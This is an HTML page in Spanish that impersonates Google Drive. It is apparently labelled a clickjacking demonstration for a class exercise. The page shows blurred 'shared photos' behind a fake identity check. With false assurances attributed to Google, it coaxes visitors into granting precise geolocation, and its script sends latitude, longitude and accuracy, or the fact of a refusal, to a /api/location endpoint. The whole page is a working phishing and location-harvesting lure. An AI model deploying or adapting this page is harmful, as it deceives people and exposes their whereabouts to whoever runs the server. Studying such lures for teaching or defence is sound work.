<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - Fotos compartidas</title>
    <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" type="image/png">
    <link
        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap"
        rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="css/drive.css">
</head>

<body>
    <!-- Google Drive header -->
    <header class="drive-header">
        <div class="header-left">
            <button class="menu-btn"><span class="material-icons">menu</span></button>
            <div class="drive-logo">
                <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Drive"
                    class="drive-icon">
                <span class="drive-text">Drive</span>
            </div>
        </div>
        <div class="header-center">
            <div class="search-bar">
                <span class="material-icons search-icon">search</span>
                <input type="text" placeholder="Buscar en Drive" disabled>
            </div>
        </div>
        <div class="header-right">
            <button class="icon-btn"><span class="material-icons">settings</span></button>
            <button class="icon-btn"><span class="material-icons">apps</span></button>
            <div class="user-avatar">M</div>
        </div>
    </header>

    <!-- Share notification banner -->
    <div class="share-banner">
        <div class="share-banner-content">
            <div class="share-avatar">
                <img src="https://ui-avatars.com/api/?name=Maria+Garcia&background=4285f4&color=fff&size=40"
                    alt="avatar">
            </div>
            <div class="share-info">
                <strong>Proyecto Demostrativo</strong> ha compartido una carpeta contigo
                <span class="share-date">Hace 2 minutos</span>
            </div>
        </div>
    </div>

    <!-- Main content -->
    <main class="drive-main">
        <div class="folder-header">
            <span class="material-icons folder-icon">folder_shared</span>
            <div class="folder-info">
                <h1>üì∏ Demostraci√≥n de Clickjacking: CEUM Pr√°ctica T2</h1>
                <p class="folder-meta">Proyecto Demostrativo ¬∑ 12 archivos</p>
            </div>
        </div>

        <!-- Photo grid with blurred previews -->
        <div class="photos-grid" id="photosGrid">
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb);"></div>
                <div class="photo-name">IMG_20260214_001.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(135deg, #ff9ff3, #f368e0, #48dbfb);"></div>
                <div class="photo-name">IMG_20260214_002.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(45deg, #0abde3, #10ac84, #feca57);"></div>
                <div class="photo-name">IMG_20260214_003.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(135deg, #ee5a24, #f9ca24, #6ab04c);"></div>
                <div class="photo-name">DSC_4521.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(45deg, #e056fd, #686de0, #30336b);"></div>
                <div class="photo-name">DSC_4522.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(135deg, #22a6b3, #7ed6df, #f0932b);"></div>
                <div class="photo-name">IMG_20260214_006.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(45deg, #badc58, #6ab04c, #22a6b3);"></div>
                <div class="photo-name">foto_grupo.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(135deg, #eb4d4b, #f0932b, #f9ca24);"></div>
                <div class="photo-name">selfie_01.jpg</div>
                <div class="photo-lock"><span class="material-icons">lock</span></div>
            </div>
            <div class="photo-card more-photos">
                <div class="photo-preview blurred"
                    style="background: linear-gradient(135deg, #535c68, #636e72, #b2bec3);"></div>
                <div class="more-overlay">+4 m√°s</div>
                <div class="photo-name">...</div>
            </div>
        </div>

        <!-- Access prompt -->
        <div class="access-prompt" id="accessPrompt">
            <div class="lock-icon-big">
                <span class="material-icons">verified_user</span>
            </div>
            <h2>Verificaci√≥n de identidad requerida</h2>
            <p>Google Drive necesita verificar tu ubicaci√≥n para confirmar tu identidad y darte acceso a los archivos
                compartidos.</p>
            <div class="verification-info">
                <div class="verify-step">
                    <span class="material-icons">looks_one</span>
                    <span>Presiona "Verificar y ver fotos"</span>
                </div>
                <div class="verify-step">
                    <span class="material-icons">looks_two</span>
                    <span>Permite el acceso a tu ubicaci√≥n cuando el navegador lo solicite</span>
                </div>
                <div class="verify-step">
                    <span class="material-icons">looks_3</span>
                    <span>Las fotos se desbloquear√°n autom√°ticamente</span>
                </div>
            </div>
            <button class="btn-ver-fotos" id="btnVerFotos">
                <span class="material-icons">my_location</span>
                Verificar y ver fotos
            </button>
            <p class="hint-text">
                <span class="material-icons" style="font-size:14px;vertical-align:middle;">lock</span>
                Protegido por Google ¬∑ Tu informaci√≥n se usa solo para verificaci√≥n
            </p>
        </div>

        <!-- Success state (hidden by default) -->
        <div class="success-state" id="successState" style="display:none;">
            <div class="success-icon">
                <span class="material-icons">check_circle</span>
            </div>
            <h2>‚úÖ Identidad verificada</h2>
            <p>Acceso concedido. Puedes ver las fotos compartidas.</p>
        </div>
    </main>

    <!-- Loading overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="google-spinner">
                <div class="spinner-ring ring-blue"></div>
                <div class="spinner-ring ring-red"></div>
                <div class="spinner-ring ring-yellow"></div>
                <div class="spinner-ring ring-green"></div>
            </div>
            <p class="loading-text" id="loadingText">Verificando identidad...</p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
    </div>

    <script>
        const btnVerFotos = document.getElementById('btnVerFotos');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const progressFill = document.getElementById('progressFill');
        const accessPrompt = document.getElementById('accessPrompt');
        const successState = document.getElementById('successState');
        const photosGrid = document.getElementById('photosGrid');

        function unlockPhotos() {
            // Remove blur and locks from all photos
            document.querySelectorAll('.photo-preview.blurred').forEach(el => {
                el.classList.remove('blurred');
                el.style.filter = 'brightness(1)';
                el.style.transform = 'scale(1)';
            });
            document.querySelectorAll('.photo-lock').forEach(el => {
                el.style.display = 'none';
            });
            document.querySelectorAll('.more-overlay').forEach(el => {
                el.style.display = 'none';
            });
            // Show success state
            accessPrompt.style.display = 'none';
            successState.style.display = 'block';
        }

        function showError() {
            loadingOverlay.classList.remove('active');
            accessPrompt.innerHTML = `
                <div class="lock-icon-big" style="background: #fce8e6;">
                    <span class="material-icons" style="color: #d93025;">error</span>
                </div>
                <h2>No se pudo verificar tu identidad</h2>
                <p>Para ver las fotos compartidas, necesitas permitir el acceso a tu ubicaci√≥n. Recarga la p√°gina e intenta de nuevo.</p>
                <button class="btn-ver-fotos" onclick="location.reload()" style="background: #5f6368;">
                    <span class="material-icons">refresh</span>
                    Intentar de nuevo
                </button>
            `;
        }

        btnVerFotos.addEventListener('click', () => {
            // Show loading overlay
            loadingOverlay.classList.add('active');
            loadingText.textContent = 'Solicitando verificaci√≥n...';
            progressFill.style.width = '10%';

            // Request geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Success - send location to server
                        loadingText.textContent = 'Verificando ubicaci√≥n...';
                        progressFill.style.width = '40%';

                        fetch('/api/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: position.timestamp
                            })
                        })
                            .then(res => res.json())
                            .then(() => {
                                loadingText.textContent = 'Identidad confirmada...';
                                progressFill.style.width = '70%';

                                setTimeout(() => {
                                    loadingText.textContent = 'Desbloqueando fotos...';
                                    progressFill.style.width = '90%';

                                    setTimeout(() => {
                                        progressFill.style.width = '100%';
                                        setTimeout(() => {
                                            loadingOverlay.classList.remove('active');
                                            unlockPhotos();
                                        }, 400);
                                    }, 800);
                                }, 1000);
                            })
                            .catch(() => {
                                loadingText.textContent = 'Desbloqueando fotos...';
                                progressFill.style.width = '100%';
                                setTimeout(() => {
                                    loadingOverlay.classList.remove('active');
                                    unlockPhotos();
                                }, 1000);
                            });
                    },
                    (error) => {
                        // Geolocation denied
                        loadingText.textContent = 'Verificaci√≥n fallida...';
                        progressFill.style.width = '100%';

                        fetch('/api/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: 'DENEGADO',
                                longitude: 'DENEGADO',
                                accuracy: null,
                                timestamp: Date.now(),
                                denied: true
                            })
                        }).finally(() => {
                            setTimeout(() => {
                                showError();
                            }, 1000);
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                loadingText.textContent = 'Navegador no compatible';
                setTimeout(() => {
                    showError();
                }, 2000);
            }
        });
    </script>
</body>

</html>